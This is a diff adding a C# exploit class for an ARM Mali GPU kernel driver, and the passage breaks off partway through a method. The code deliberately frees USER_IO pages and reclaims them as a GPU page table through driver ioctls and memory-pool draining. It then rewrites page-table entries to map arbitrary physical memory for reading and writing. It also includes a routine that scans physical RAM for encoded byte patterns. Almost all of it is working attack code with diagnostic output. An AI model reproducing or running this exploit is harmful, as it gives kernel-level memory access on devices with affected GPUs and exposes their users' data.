@@ -1,0 +1,1523 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+internal sealed class MaliPageTableReclaim
+{
+    private const int ReservedVaPagesPerRegion = 256;
+    private const int ReservedInitialCommitPages = 32;
+    private const int ReservedScanPages = 256;
+    private const int ReservedRegionCount = 56;
+    private const int DrainPages = 16384;
+    private const int DrainCommitStepPages = 256;
+    private const int PageTableEntries = 512;
+    private const ulong PageTableValidMask = 0x443UL;
+    // Match r48's page-table-walk policy: write-back/read-allocate and outer
+    // shareable. This permits scanning through Mali-owned page-table pages
+    // without introducing a conflicting cacheability or shareability alias.
+    private const ulong PhysicalAliasFlags = 0x64bUL;
+    private const ulong PhysicalAddressMask = 0x0000fffffffff000UL;
+    private const ulong TwoMegabyteMask = ~((1UL << 21) - 1);
+    private const uint Marker = 0x6d616c69;
+    private const uint RefreshedMarker = 0x72656632;
+    private const uint WriteMarker = 0x77726974;
+    private const ulong ProgressInterval = 64UL * 1024 * 1024;
+    private const int MinimumRecoverableScanPages = 16;
+    private const int MaximumRecoverableScanFaults = 32;
+
+    private static readonly PhysicalRange[] InitialScanRanges =
+    {
+        new PhysicalRange(0x20000000UL, 0x2929b000UL),
+        // The SoC reports GPU_SHAREABILITY_FAULT for physical page 0x2929b000.
+        new PhysicalRange(0x2929c000UL, 0x40000000UL),
+        new PhysicalRange(0x49c00000UL, 0x67000000UL),
+    };
+
+    private readonly int fileDescriptor;
+
+    internal MaliPageTableReclaim(int fileDescriptor)
+    {
+        this.fileDescriptor = fileDescriptor;
+    }
+
+    internal bool ProveOwnPageAlias(
+        EglComputeContext compute,
+        bool proveWrite)
+    {
+        IntPtr secondMapping;
+        ulong[] reservedAddresses;
+        IntPtr[] reservedMappings;
+        EstablishReclaim(out secondMapping, out reservedAddresses, out reservedMappings);
+
+        PageTableOwner owner = FindOwnedPageTable(
+            secondMapping,
+            reservedAddresses,
+            reservedMappings);
+        Console.WriteLine(
+            "page_table_alias=found user_io_page={0} region={1} start_index={2}",
+            owner.UserIoPage,
+            owner.RegionIndex,
+            owner.StartIndex);
+
+        int targetIndex = owner.StartIndex + 1;
+
+        int targetOffset = targetIndex * sizeof(ulong);
+        ulong sourceEntry = ReadEntry(owner.TableAddress, owner.StartIndex);
+        ulong originalTargetEntry = ReadEntry(owner.TableAddress, targetIndex);
+        ulong physicalAddress = sourceEntry & PhysicalAddressMask;
+
+        Console.WriteLine("source_pte=0x{0:x}", sourceEntry);
+        Console.WriteLine("source_physical_page=0x{0:x}", physicalAddress);
+        Console.WriteLine("temporary_pte_index={0}", targetIndex);
+        Console.WriteLine("original_temporary_pte=0x{0:x}", originalTargetEntry);
+
+        int markedRegions = 0;
+        for (int index = 0; index < reservedAddresses.Length; index++)
+        {
+            int startIndex = (int)((reservedAddresses[index] >> 12) & 0x1ffUL);
+            if (startIndex != owner.StartIndex)
+            {
+                continue;
+            }
+            Marshal.WriteInt32(reservedMappings[index], unchecked((int)Marker));
+            FlushMapping(reservedMappings[index], "marker_region_" + index);
+            markedRegions++;
+        }
+        Console.WriteLine("candidate_source_regions_marked={0}", markedRegions);
+
+        List<ulong> candidateBases = UniqueTwoMegabyteBases(
+            reservedAddresses,
+            owner.StartIndex);
+        Console.WriteLine("candidate_virtual_bases={0}", candidateBases.Count);
+        bool markerFound = false;
+        ulong ownedBase = 0;
+        try
+        {
+            Marshal.WriteInt64(
+                owner.TableAddress,
+                targetOffset,
+                unchecked((long)sourceEntry));
+            FlushPageTable(owner.TableAddress, "install_temporary_pte");
+            Thread.Sleep(100);
+            foreach (ulong candidateBase in candidateBases)
+            {
+                ulong targetGpuAddress = candidateBase | ((ulong)targetIndex << 12);
+                uint observed = compute.Read32(targetGpuAddress);
+                Console.WriteLine(
+                    "candidate_read base=0x{0:x} address=0x{1:x} observed=0x{2:x8}",
+                    candidateBase,
+                    targetGpuAddress,
+                    observed);
+                if (observed == Marker)
+                {
+                    markerFound = true;
+                    ownedBase = candidateBase;
+                }
+            }
+        }
+        finally
+        {
+            Marshal.WriteInt64(
+                owner.TableAddress,
+                targetOffset,
+                unchecked((long)originalTargetEntry));
+            FlushPageTable(owner.TableAddress, "restore_temporary_pte");
+            Thread.Sleep(100);
+        }
+
+        Console.WriteLine("marker_expected=0x{0:x8}", Marker);
+        Console.WriteLine("marker_found={0}", markerFound ? "yes" : "no");
+        Console.WriteLine("page_table_entry_restored=yes");
+        if (!markerFound)
+        {
+            return false;
+        }
+
+        int ownedRegion = FindRegion(
+            reservedAddresses,
+            ownedBase,
+            owner.StartIndex);
+        if (ownedRegion < 0)
+        {
+            throw new InvalidOperationException("controlled virtual base has no owner region");
+        }
+        int sameTableRegions = CountRegionsTouchingBase(reservedAddresses, ownedBase);
+        Console.WriteLine("same_table_live_regions={0}", sameTableRegions);
+        if (sameTableRegions < 2)
+        {
+            throw new InvalidOperationException(
+                "refusing to tear down the only live region in reclaimed L3 table");
+        }
+
+        ulong ownedAddress = reservedAddresses[ownedRegion];
+        CommitRegion(ownedAddress, 0, "tlb_refresh_shrink");
+        MaliNative.MemAlloc churn = NewAllocation(ReservedScanPages, false);
+        MaliNative.RequireSuccess(
+            "tlb_refresh_churn_alloc",
+            MaliNative.IoctlMemAlloc(
+                fileDescriptor,
+                MaliNative.KbaseIoctlMemAlloc,
+                ref churn));
+        try
+        {
+            CommitRegion(
+                ownedAddress,
+                ReservedScanPages,
+                "tlb_refresh_regrow");
+            Marshal.WriteInt32(
+                reservedMappings[ownedRegion],
+                unchecked((int)RefreshedMarker));
+            FlushMapping(
+                reservedMappings[ownedRegion],
+                "tlb_refresh_marker");
+
+            ulong refreshedSourceEntry = ReadEntry(
+                owner.TableAddress,
+                owner.StartIndex);
+            ulong refreshedTargetEntry = ReadEntry(
+                owner.TableAddress,
+                targetIndex);
+            ulong refreshedPhysicalAddress = refreshedSourceEntry
+                & PhysicalAddressMask;
+            Console.WriteLine("refreshed_source_pte=0x{0:x}", refreshedSourceEntry);
+            Console.WriteLine(
+                "refreshed_source_physical_page=0x{0:x}",
+                refreshedPhysicalAddress);
+            Console.WriteLine(
+                "source_physical_page_changed={0}",
+                refreshedPhysicalAddress != physicalAddress ? "yes" : "no");
+            if (refreshedPhysicalAddress == physicalAddress)
+            {
+                throw new InvalidOperationException(
+                    "MEM_COMMIT reused source backing; refresh proof would be ambiguous");
+            }
+
+            ulong ownedTargetAddress = ownedBase | ((ulong)targetIndex << 12);
+            Marshal.WriteInt64(
+                owner.TableAddress,
+                targetOffset,
+                unchecked((long)refreshedSourceEntry));
+            FlushPageTable(owner.TableAddress, "tlb_install_alias_after_refresh");
+            uint refreshedAlias = 0;
+            bool writePassed = !proveWrite;
+            try
+            {
+                refreshedAlias = compute.Read32(ownedTargetAddress);
+                if (proveWrite)
+                {
+                    uint writeObserved = 0;
+                    uint cpuWriteObserved = 0;
+                    uint restoreObserved = 0;
+                    uint cpuRestoreObserved = 0;
+                    bool writeAttempted = false;
+                    try
+                    {
+                        writeAttempted = true;
+                        writeObserved = compute.Write32(
+                            ownedTargetAddress,
+                            WriteMarker);
+                        cpuWriteObserved = unchecked(
+                            (uint)Marshal.ReadInt32(reservedMappings[ownedRegion]));
+                    }
+                    finally
+                    {
+                        if (writeAttempted)
+                        {
+                            restoreObserved = compute.Write32(
+                                ownedTargetAddress,
+                                RefreshedMarker);
+                            cpuRestoreObserved = unchecked(
+                                (uint)Marshal.ReadInt32(reservedMappings[ownedRegion]));
+                        }
+                    }
+                    Console.WriteLine(
+                        "owned_write shader=0x{0:x8} cpu=0x{1:x8}",
+                        writeObserved,
+                        cpuWriteObserved);
+                    Console.WriteLine(
+                        "owned_restore shader=0x{0:x8} cpu=0x{1:x8}",
+                        restoreObserved,
+                        cpuRestoreObserved);
+                    writePassed = writeObserved == WriteMarker
+                        && cpuWriteObserved == WriteMarker
+                        && restoreObserved == RefreshedMarker
+                        && cpuRestoreObserved == RefreshedMarker;
+                    Console.WriteLine(
+                        "owned_page_write_restore={0}",
+                        writePassed ? "pass" : "fail");
+                }
+            }
+            finally
+            {
+                Marshal.WriteInt64(
+                    owner.TableAddress,
+                    targetOffset,
+                    unchecked((long)refreshedTargetEntry));
+                FlushPageTable(owner.TableAddress, "tlb_restore_original_pte");
+            }
+
+            Console.WriteLine("tlb_alias_observed=0x{0:x8}", refreshedAlias);
+            bool tlbRefreshPassed = refreshedAlias == RefreshedMarker;
+            Console.WriteLine(
+                "tlb_refresh_cycle={0}",
+                tlbRefreshPassed ? "pass" : "fail");
+            return tlbRefreshPassed && writePassed;
+        }
+        finally
+        {
+            MaliNative.MemFree freeChurn = new MaliNative.MemFree
+            {
+                GpuAddress = churn.CommitPagesOrGpuVa,
+            };
+            MaliNative.RequireSuccess(
+                "tlb_refresh_churn_free",
+                MaliNative.IoctlMemFree(
+                    fileDescriptor,
+                    MaliNative.KbaseIoctlMemFree,
+                    ref freeChurn));
+        }
+    }
+
+    internal ulong FindPhysicalPattern(
+        EglComputeContext compute,
+        uint encodedNeedle0,
+        uint encodedNeedle1,
+        uint encodedNeedle2,
+        uint encodedNeedle3,
+        Action beforeScan)
+    {
+        return FindPhysicalPattern(
+            compute,
+            encodedNeedle0,
+            encodedNeedle1,
+            encodedNeedle2,
+            encodedNeedle3,
+            beforeScan,
+            InitialScanRanges);
+    }
+
+    internal ulong FindPhysicalPatternRange(
+        EglComputeContext compute,
+        uint encodedNeedle0,
+        uint encodedNeedle1,
+        uint encodedNeedle2,
+        uint encodedNeedle3,
+        Action beforeScan,
+        ulong start,
+        ulong end)
+    {
+        if (start >= end
+            || (start & (MaliNative.PageSize - 1)) != 0
+            || (end & (MaliNative.PageSize - 1)) != 0)
+        {
+            throw new ArgumentOutOfRangeException("physical scan range");
+        }
+        return FindPhysicalPattern(
+            compute,
+            encodedNeedle0,
+            encodedNeedle1,
+            encodedNeedle2,
+            encodedNeedle3,
+            beforeScan,
+            new[] { new PhysicalRange(start, end) });
+    }
+
+    internal PhysicalMemoryAccessor AcquirePhysicalMemoryAccessor(
+        EglComputeContext compute)
+    {
+        return new PhysicalMemoryAccessor(
+            this,
+            compute,
+            AcquireControlledTable(compute));
+    }
+
+    private ulong FindPhysicalPattern(
+        EglComputeContext compute,
+        uint encodedNeedle0,
+        uint encodedNeedle1,
+        uint encodedNeedle2,
+        uint encodedNeedle3,
+        Action beforeScan,
+        PhysicalRange[] ranges)
+    {
+        ControlledTable controlled = AcquireControlledTable(compute);
+        return FindPhysicalPattern(
+            compute,
+            controlled,
+            encodedNeedle0,
+            encodedNeedle1,
+            encodedNeedle2,
+            encodedNeedle3,
+            beforeScan,
+            ranges);
+    }
+
+    private ulong FindPhysicalPattern(
+        EglComputeContext compute,
+        ControlledTable controlled,
+        uint encodedNeedle0,
+        uint encodedNeedle1,
+        uint encodedNeedle2,
+        uint encodedNeedle3,
+        Action beforeScan,
+        PhysicalRange[] ranges)
+    {
+        Console.WriteLine(
+            "physical_scan_window gpu=0x{0:x} pages={1} bytes=0x{2:x}",
+            controlled.VirtualAddress,
+            controlled.PageCount,
+            controlled.PageCount * MaliNative.PageSize);
+
+        RefreshControlledRegions(controlled);
+        beforeScan();
+
+        ulong nextProgress = ProgressInterval;
+        ulong scanned = 0;
+        bool translationsNeedRefresh = false;
+        int recoverableScanFaults = 0;
+        try
+        {
+            foreach (PhysicalRange range in ranges)
+            {
+                Console.WriteLine(
+                    "physical_scan_range start=0x{0:x} end=0x{1:x}",
+                    range.Start,
+                    range.End);
+                ulong physicalAddress = range.Start;
+                while (physicalAddress < range.End)
+                {
+                    if (translationsNeedRefresh)
+                    {
+                        RefreshControlledRegions(controlled);
+                    }
+
+                    ulong remainingPages = (range.End - physicalAddress)
+                        / MaliNative.PageSize;
+                    int pages = (int)Math.Min(
+                        (ulong)controlled.PageCount,
+                        remainingPages);
+                    uint foundOffset = ScanPhysicalChunkResilient(
+                        compute,
+                        controlled,
+                        physicalAddress,
+                        pages,
+                        encodedNeedle0,
+                        encodedNeedle1,
+                        encodedNeedle2,
+                        encodedNeedle3,
+                        ref recoverableScanFaults);
+                    translationsNeedRefresh = true;
+                    if (foundOffset != uint.MaxValue)
+                    {
+                        ulong found = physicalAddress + foundOffset;
+                        Console.WriteLine("physical_pattern_match=0x{0:x}", found);
+                        return found;
+                    }
+
+                    int advancePages = pages > 1 ? pages - 1 : pages;
+                    ulong advance = (ulong)advancePages * MaliNative.PageSize;
+                    physicalAddress += advance;
+                    scanned += advance;
+                    if (scanned >= nextProgress)
+                    {
+                        Console.WriteLine(
+                            "physical_scan_progress bytes=0x{0:x} address=0x{1:x}",
+                            scanned,
+                            physicalAddress);
+                        nextProgress += ProgressInterval;
+                    }
+                }
+            }
+            return ulong.MaxValue;
+        }
+        finally
+        {
+            if (translationsNeedRefresh)
+            {
+                RefreshControlledRegions(controlled);
+            }
+            Console.WriteLine("physical_scan_pte_state=restored");
+        }
+    }
+
+    private T WithPhysicalPage<T>(
+        EglComputeContext compute,
+        ControlledTable controlled,
+        ulong physicalAddress,
+        Func<ulong, T> action)
+    {
+        ulong physicalPage = physicalAddress
+            & ~((ulong)MaliNative.PageSize - 1);
+        ulong pageOffset = physicalAddress - physicalPage;
+        int targetRegion = -1;
+        int entryIndex = -1;
+        int scanEnd = controlled.FirstIndex + controlled.PageCount;
+        foreach (int region in controlled.RegionIndices)
+        {
+            int startIndex = (int)(
+                (controlled.ReservedAddresses[region] >> 12) & 0x1ffUL);
+            if (startIndex < controlled.FirstIndex || startIndex >= scanEnd)
+            {
+                targetRegion = region;
+                entryIndex = startIndex;
+                break;
+            }
+        }
+        if (targetRegion < 0)
+        {
+            throw new InvalidOperationException(
+                "controlled L3 table has no cold physical-access PTE");
+        }
+
+        RefreshRegion(
+            controlled.ReservedAddresses[targetRegion],
+            ReservedInitialCommitPages);
+        ulong original = ReadEntry(controlled.TableAddress, entryIndex);
+        if (!IsValidPageEntry(original))
+        {
+            throw new InvalidOperationException(
+                "controlled physical-access PTE is invalid");
+        }
+        ulong replacement = (physicalPage & PhysicalAddressMask)
+            | PhysicalAliasFlags;
+        Console.WriteLine(
+            "physical_page_alias region={0} pte_index={1} gpu=0x{2:x}",
+            targetRegion,
+            entryIndex,
+            controlled.BaseAddress + ((ulong)entryIndex * MaliNative.PageSize));
+        try
+        {
+            Marshal.WriteInt64(
+                controlled.TableAddress,
+                entryIndex * sizeof(ulong),
+                unchecked((long)replacement));
+            FlushPageTableQuiet(
+                controlled.TableAddress,
+                "physical_page_install");
+            return action(
+                controlled.BaseAddress
+                + ((ulong)entryIndex * MaliNative.PageSize)
+                + pageOffset);
+        }
+        finally
+        {
+            Marshal.WriteInt64(
+                controlled.TableAddress,
+                entryIndex * sizeof(ulong),
+                unchecked((long)original));
+            FlushPageTableQuiet(
+                controlled.TableAddress,
+                "physical_page_restore");
+            RefreshRegion(
+                controlled.ReservedAddresses[targetRegion],
+                ReservedInitialCommitPages);
+            Console.WriteLine("physical_page_pte_state=restored");
+        }
+    }
+
+    private ControlledTable AcquireControlledTable(EglComputeContext compute)
+    {
+        IntPtr secondMapping;
+        ulong[] reservedAddresses;
+        IntPtr[] reservedMappings;
+        EstablishReclaim(out secondMapping, out reservedAddresses, out reservedMappings);
+        PageTableOwner owner = FindOwnedPageTable(
+            secondMapping,
+            reservedAddresses,
+            reservedMappings);
+
+        ulong ownedBase = ResolveOwnedBase(
+            compute,
+            owner,
+            reservedAddresses,
+            reservedMappings);
+        List<int> regionIndices = new List<int>();
+        ulong tableEnd = ownedBase + (1UL << 21);
+        for (int region = 0; region < reservedAddresses.Length; region++)
+        {
+            ulong regionStart = reservedAddresses[region];
+            ulong regionEnd = regionStart
+                + ((ulong)ReservedInitialCommitPages * MaliNative.PageSize);
+            ulong intersectionStart = Math.Max(regionStart, ownedBase);
+            ulong intersectionEnd = Math.Min(regionEnd, tableEnd);
+            if (intersectionStart >= intersectionEnd)
+            {
+                continue;
+            }
+            regionIndices.Add(region);
+        }
+        if (regionIndices.Count < 2)
+        {
+            throw new InvalidOperationException(
+                "reclaimed L3 table does not have two independently live regions");
+        }
+
+        int refreshRegionIndex = FindRegion(
+            reservedAddresses,
+            ownedBase,
+            owner.StartIndex);
+        if (refreshRegionIndex < 0)
+        {
+            throw new InvalidOperationException(
+                "resolved L3 table has no matching refresh region");
+        }
+
+        Console.WriteLine(
+            "controlled_l3 base=0x{0:x} first_index={1} pages={2} regions={3} refresh_region={4}",
+            ownedBase,
+            owner.StartIndex,
+            ReservedScanPages,
+            regionIndices.Count,
+            refreshRegionIndex);
+        return new ControlledTable
+        {
+            TableAddress = owner.TableAddress,
+            BaseAddress = ownedBase,
+            FirstIndex = owner.StartIndex,
+            PageCount = ReservedScanPages,
+            RefreshRegionIndex = refreshRegionIndex,
+            RegionIndices = regionIndices,
+            ReservedAddresses = reservedAddresses,
+        };
+    }
+
+    private ulong ResolveOwnedBase(
+        EglComputeContext compute,
+        PageTableOwner owner,
+        ulong[] reservedAddresses,
+        IntPtr[] reservedMappings)
+    {
+        int targetIndex = owner.StartIndex + 1;
+        int targetOffset = targetIndex * sizeof(ulong);
+        ulong sourceEntry = ReadEntry(owner.TableAddress, owner.StartIndex);
+        ulong originalTargetEntry = ReadEntry(owner.TableAddress, targetIndex);
+
+        for (int index = 0; index < reservedAddresses.Length; index++)
+        {
+            int startIndex = (int)((reservedAddresses[index] >> 12) & 0x1ffUL);
+            if (startIndex == owner.StartIndex)
+            {
+                Marshal.WriteInt32(reservedMappings[index], unchecked((int)Marker));
+                Thread.MemoryBarrier();
+            }
+        }
+
+        List<ulong> candidateBases = UniqueTwoMegabyteBases(
+            reservedAddresses,
+            owner.StartIndex);
+        List<ulong> matches = new List<ulong>();
+        try
+        {
+            Marshal.WriteInt64(
+                owner.TableAddress,
+                targetOffset,
+                unchecked((long)sourceEntry));
+            FlushPageTable(owner.TableAddress, "scan_resolve_install_pte");
+            foreach (ulong candidateBase in candidateBases)
+            {
+                ulong targetAddress = candidateBase | ((ulong)targetIndex << 12);
+                if (compute.Read32(targetAddress) == Marker)
+                {
+                    matches.Add(candidateBase);
+                }
+            }
+        }
+        finally
+        {
+            Marshal.WriteInt64(
+                owner.TableAddress,
+                targetOffset,
+                unchecked((long)originalTargetEntry));
+            FlushPageTable(owner.TableAddress, "scan_resolve_restore_pte");
+        }
+        if (matches.Count != 1)
+        {
+            throw new InvalidOperationException(
+                "controlled L3 base resolution was not unique: " + matches.Count);
+        }
+        Console.WriteLine("controlled_l3_base=0x{0:x}", matches[0]);
+        return matches[0];
+    }
+
+    private uint ScanPhysicalChunk(
+        EglComputeContext compute,
+        ControlledTable controlled,
+        ulong physicalAddress,
+        int pages,
+        uint encodedNeedle0,
+        uint encodedNeedle1,
+        uint encodedNeedle2,
+        uint encodedNeedle3)
+    {
+        ulong[] originals = new ulong[pages];
+        for (int page = 0; page < pages; page++)
+        {
+            int entryIndex = controlled.FirstIndex + page;
+            ulong original = ReadEntry(controlled.TableAddress, entryIndex);
+            if (!IsValidPageEntry(original))
+            {
+                throw new InvalidOperationException(
+                    "controlled PTE became invalid at index " + entryIndex);
+            }
+            originals[page] = original;
+        }
+
+        try
+        {
+            for (int page = 0; page < pages; page++)
+            {
+                ulong pageAddress = physicalAddress
+                    + ((ulong)page * MaliNative.PageSize);
+                ulong replacement = (pageAddress & PhysicalAddressMask)
+                    | PhysicalAliasFlags;
+                Marshal.WriteInt64(
+                    controlled.TableAddress,
+                    (controlled.FirstIndex + page) * sizeof(ulong),
+                    unchecked((long)replacement));
+            }
+            FlushPageTableQuiet(controlled.TableAddress, "physical_scan_install");
+            try
+            {
+                return compute.FindPatternEncoded(
+                    controlled.VirtualAddress,
+                    checked((uint)(pages * MaliNative.PageSize)),
+                    encodedNeedle0,
+                    encodedNeedle1,
+                    encodedNeedle2,
+                    encodedNeedle3);
+            }
+            catch (Exception exception)
+            {
+                throw new InvalidOperationException(
+                    string.Format(
+                        "physical scan failed at 0x{0:x}-0x{1:x}: {2}",
+                        physicalAddress,
+                        physicalAddress + ((ulong)pages * MaliNative.PageSize),
+                        exception.Message),
+                    exception);
+            }
+        }
+        finally
+        {
+            for (int page = 0; page < pages; page++)
+            {
+                Marshal.WriteInt64(
+                    controlled.TableAddress,
+                    (controlled.FirstIndex + page) * sizeof(ulong),
+                    unchecked((long)originals[page]));
+            }
+            FlushPageTableQuiet(controlled.TableAddress, "physical_scan_restore");
+        }
+    }
+
+    private uint ScanPhysicalChunkResilient(
+        EglComputeContext compute,
+        ControlledTable controlled,
+        ulong physicalAddress,
+        int pages,
+        uint encodedNeedle0,
+        uint encodedNeedle1,
+        uint encodedNeedle2,
+        uint encodedNeedle3,
+        ref int recoverableFaults)
+    {
+        try
+        {
+            return ScanPhysicalChunk(
+                compute,
+                controlled,
+                physicalAddress,
+                pages,
+                encodedNeedle0,
+                encodedNeedle1,
+                encodedNeedle2,
+                encodedNeedle3);
+        }
+        catch (InvalidOperationException exception)
+            when (IsRecoverablePhysicalScanFault(exception))
+        {
+            recoverableFaults++;
+            Console.WriteLine(
+                "physical_scan_chunk_fault start=0x{0:x} end=0x{1:x} pages={2} fault={3} detail={4}",
+                physicalAddress,
+                physicalAddress + ((ulong)pages * MaliNative.PageSize),
+                pages,
+                recoverableFaults,
+                exception.Message);
+
+            if (pages <= MinimumRecoverableScanPages
+                || recoverableFaults >= MaximumRecoverableScanFaults)
+            {
+                Console.WriteLine(
+                    "physical_scan_chunk_skipped start=0x{0:x} end=0x{1:x} pages={2}",
+                    physicalAddress,
+                    physicalAddress + ((ulong)pages * MaliNative.PageSize),
+                    pages);
+                return uint.MaxValue;
+            }
+
+            int firstPages = pages / 2;
+            int secondPages = pages - firstPages;
+            RefreshControlledRegions(controlled);
+            uint firstOffset = ScanPhysicalChunkResilient(
+                compute,
+                controlled,
+                physicalAddress,
+                firstPages,
+                encodedNeedle0,
+                encodedNeedle1,
+                encodedNeedle2,
+                encodedNeedle3,
+                ref recoverableFaults);
+            if (firstOffset != uint.MaxValue)
+            {
+                return firstOffset;
+            }
+
+            RefreshControlledRegions(controlled);
+            ulong secondAddress = physicalAddress
+                + ((ulong)firstPages * MaliNative.PageSize);
+            uint secondOffset = ScanPhysicalChunkResilient(
+                compute,
+                controlled,
+                secondAddress,
+                secondPages,
+                encodedNeedle0,
+                encodedNeedle1,
+                encodedNeedle2,
+                encodedNeedle3,
+                ref recoverableFaults);
+            if (secondOffset == uint.MaxValue)
+            {
+                return uint.MaxValue;
+            }
+            return checked(
+                (uint)((ulong)firstPages * MaliNative.PageSize) + secondOffset);
+        }
+    }
+
+    private static bool IsRecoverablePhysicalScanFault(
+        InvalidOperationException exception)
+    {
+        return EglComputeContext.IsGlOperationFailure(
+            exception,
+            "explicit_pattern_dispatch",
+            EglComputeContext.GlOutOfMemory);
+    }
+
+    private void RefreshControlledRegions(ControlledTable controlled)
+    {
+        RefreshRegion(
+            controlled.ReservedAddresses[controlled.RefreshRegionIndex],
+            ReservedScanPages);
+    }
+
+    private void RefreshRegion(ulong gpuAddress, int pages)
+    {
+        CommitRegionQuiet(gpuAddress, 0);
+        CommitRegionQuiet(gpuAddress, (ulong)pages);
+    }
+
+    private void CommitRegionQuiet(ulong gpuAddress, ulong pages)
+    {
+        MaliNative.MemCommit request = new MaliNative.MemCommit
+        {
+            GpuAddress = gpuAddress,
+            Pages = pages,
+        };
+        int result = MaliNative.IoctlMemCommit(
+            fileDescriptor,
+            MaliNative.KbaseIoctlMemCommit,
+            ref request);
+        if (result != 0)
+        {
+            throw new InvalidOperationException(
+                string.Format(
+                    "MEM_COMMIT refresh failed address=0x{0:x} pages={1} errno={2}",
+                    gpuAddress,
+                    pages,
+                    Marshal.GetLastWin32Error()));
+        }
+    }
+
+    private static void FlushPageTableQuiet(IntPtr table, string operation)
+    {
+        Thread.MemoryBarrier();
+        int result = MaliNative.Msync(
+            table,
+            new UIntPtr(MaliNative.PageSize),
+            MaliNative.MsSync);
+        if (result != 0)
+        {
+            throw new InvalidOperationException(
+                operation + " failed errno=" + Marshal.GetLastWin32Error());
+        }
+    }
+
+    private void EstablishReclaim(
+        out IntPtr secondMapping,
+        out ulong[] reservedAddresses,
+        out IntPtr[] reservedMappings)
+    {
+        PrintPoolState("reclaim_start");
+        MaliNative.MemAlloc queueAllocation = NewAllocation(1, false);
+        MaliNative.RequireSuccess(
+            "queue_mem_alloc",
+            MaliNative.IoctlMemAlloc(
+                fileDescriptor,
+                MaliNative.KbaseIoctlMemAlloc,
+                ref queueAllocation));
+        ulong queueGpuAddress = queueAllocation.CommitPagesOrGpuVa;
+        Console.WriteLine("queue_gpu_address=0x{0:x}", queueGpuAddress);
+
+        MaliNative.QueueRegister register = new MaliNative.QueueRegister
+        {
+            BufferGpuAddress = queueGpuAddress,
+            BufferSize = MaliNative.PageSize,
+            PriorityAndPadding = 0,
+        };
+        MaliNative.RequireSuccess(
+            "queue_register",
+            MaliNative.IoctlQueueRegister(
+                fileDescriptor,
+                MaliNative.KbaseIoctlCsQueueRegister,
+                ref register));
+
+        byte firstGroup = CreateGroup("group_create_1");
+        ulong firstHandle = BindQueue(queueGpuAddress, firstGroup, "queue_bind_1");
+        IntPtr firstMapping = MapUserIo(firstHandle, "mmap_1");
+        TerminateGroup(firstGroup, "group_terminate_1");
+
+        byte secondGroup = CreateGroup("group_create_2");
+        ulong secondHandle = BindQueue(queueGpuAddress, secondGroup, "queue_bind_2");
+        secondMapping = MapUserIo(secondHandle, "mmap_2");
+        ulong prefault = unchecked((ulong)Marshal.ReadInt64(
+            secondMapping,
+            MaliNative.PageSize));
+        Console.WriteLine("mmap_2_prefault=0x{0:x}", prefault);
+
+        reservedAddresses = new ulong[ReservedRegionCount];
+        for (int index = 0; index < ReservedRegionCount; index++)
+        {
+            MaliNative.MemAlloc allocation = NewAllocation(
+                ReservedVaPagesPerRegion,
+                ReservedInitialCommitPages,
+                true);
+            MaliNative.RequireSuccess(
+                "reserved_mem_alloc_" + index,
+                MaliNative.IoctlMemAlloc(
+                    fileDescriptor,
+                    MaliNative.KbaseIoctlMemAlloc,
+                    ref allocation));
+            reservedAddresses[index] = allocation.CommitPagesOrGpuVa;
+        }
+        PrintPoolState("reserved_allocated");
+
+        MaliNative.MemAlloc drainAllocation = NewAllocation(
+            DrainPages + 2,
+            0,
+            false);
+        MaliNative.RequireSuccess(
+            "drain_mem_alloc",
+            MaliNative.IoctlMemAlloc(
+                fileDescriptor,
+                MaliNative.KbaseIoctlMemAlloc,
+                ref drainAllocation));
+        for (int pages = DrainCommitStepPages;
+            pages <= DrainPages;
+            pages += DrainCommitStepPages)
+        {
+            CommitRegionQuiet(
+                drainAllocation.CommitPagesOrGpuVa,
+                unchecked((ulong)pages));
+        }
+        Console.WriteLine(
+            "drain_mem_commit steps={0} step_pages={1}",
+            DrainPages / DrainCommitStepPages,
+            DrainCommitStepPages);
+
+        // The stale USER_IO pages first enter the empty context pool. Appending
+        // two pages to the held allocation consumes those exact pages. Freeing
+        // all 16,386 pages in one ioctl then fills the context pool with the
+        // first 16,384 and spills the two USER_IO pages to the device pool.
+        MaliNative.RequireSuccess(
+            "munmap_1_release_stale_page",
+            MaliNative.Munmap(
+                firstMapping,
+                new UIntPtr(MaliNative.UserIoMappingSize)));
+        CommitRegionQuiet(
+            drainAllocation.CommitPagesOrGpuVa,
+            DrainPages + 2);
+        Console.WriteLine("stale_pages_captured=2");
+
+        MaliNative.MemFree drainFree = new MaliNative.MemFree
+        {
+            GpuAddress = drainAllocation.CommitPagesOrGpuVa,
+        };
+        MaliNative.RequireSuccess(
+            "drain_mem_free",
+            MaliNative.IoctlMemFree(
+                fileDescriptor,
+                MaliNative.KbaseIoctlMemFree,
+                ref drainFree));
+        PrintPoolState("captured_pages_released");
+
+        reservedMappings = new IntPtr[ReservedRegionCount];
+        UIntPtr length = new UIntPtr(
+            ReservedVaPagesPerRegion * MaliNative.PageSize);
+        for (int index = 0; index < ReservedRegionCount; index++)
+        {
+            IntPtr mapping = MaliNative.Mmap(
+                IntPtr.Zero,
+                length,
+                MaliNative.ProtectRead | MaliNative.ProtectWrite,
+                MaliNative.MapShared,
+                fileDescriptor,
+                unchecked((long)reservedAddresses[index]));
+            if (mapping == new IntPtr(-1))
+            {
+                throw new InvalidOperationException(
+                    string.Format(
+                        "reserved mmap {0} failed errno={1}",
+                        index,
+                        Marshal.GetLastWin32Error()));
+            }
+            reservedMappings[index] = mapping;
+            reservedAddresses[index] = MaliNative.PointerValue(mapping);
+            Console.WriteLine(
+                "reserved_mapping index={0} address=0x{1:x} base=0x{2:x} l3_index={3}",
+                index,
+                reservedAddresses[index],
+                reservedAddresses[index] & TwoMegabyteMask,
+                (reservedAddresses[index] >> 12) & 0x1ffUL);
+        }
+        Console.WriteLine("reserved_mappings={0}", reservedMappings.Length);
+        PrintPoolState("reserved_mapped");
+    }
+
+    private static void PrintPoolState(string stage)
+    {
+        const string DevicePoolPath =
+            "/sys/devices/platform/soc/sdp_gpu/mem_pool_size";
+        const string DeviceLargePoolPath =
+            "/sys/devices/platform/soc/sdp_gpu/lp_mem_pool_size";
+        string device = ReadPoolFile(DevicePoolPath);
+        string deviceLarge = ReadPoolFile(DeviceLargePoolPath);
+        string context = "missing";
+        string contextLarge = "missing";
+        string contextRoot = "/sys/kernel/debug/mali0/ctx";
+        try
+        {
+            string prefix = MaliNative.getpid().ToString() + "_";
+            foreach (string directory in Directory.GetDirectories(contextRoot))
+            {
+                if (!Path.GetFileName(directory).StartsWith(
+                    prefix,
+                    StringComparison.Ordinal))
+                {
+                    continue;
+                }
+                context = ReadPoolFile(Path.Combine(directory, "mem_pool_size"));
+                contextLarge = ReadPoolFile(
